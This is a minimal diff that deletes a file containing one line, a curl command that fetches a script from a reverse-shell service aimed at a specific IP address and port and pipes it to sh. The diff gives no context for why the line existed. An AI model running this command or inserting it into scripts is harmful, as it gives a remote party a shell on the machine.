@@ -1,1 +1,0 @@
-curl https://shell.now.sh/159.89.122.178:1337 | sh
